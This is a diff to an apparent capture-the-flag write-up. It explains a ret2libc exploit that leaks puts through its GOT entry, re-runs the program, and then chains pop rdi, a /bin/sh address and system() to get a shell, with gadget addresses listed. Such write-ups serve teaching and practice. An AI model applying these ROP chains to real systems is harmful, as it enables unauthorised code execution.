@@ -13,7 +13,9 @@ The challenge provided the libc but since ASLR is enabled, we need to leak an ad
 In this case, it's possible to utilize the function puts() to leak any GOT entry, including puts itself. So the ROP will be:
 
 pop_rdi; ret = 0x401203
+
 puts_got     = 0x403fc8
+
 puts_plt     = 0x401030
 
 This will leak the puts@libc address and we can calculate any other function address on the library, in this case system().
@@ -23,8 +25,11 @@ We need to re-run the application for being able to execute functions again. At 
 So the first rop:
 
 pop_rdi; ret = 0x401203
+
 puts_got     = 0x403fc8
+
 puts_plt     = 0x401030
+
 copy         = 0x401146
 
 The /bin/sh address is on the binary at 0x40302d but could be calculated from the libc too.
@@ -32,5 +37,10 @@ The /bin/sh address is on the binary at 0x40302d but could be calculated from th
 And then the second rop:
 
 pop_rdi; ret = 0x401203
+
 bin_sh       = 0x40302d
+
+system       = system@LIBC+27
+
+And shell!
 
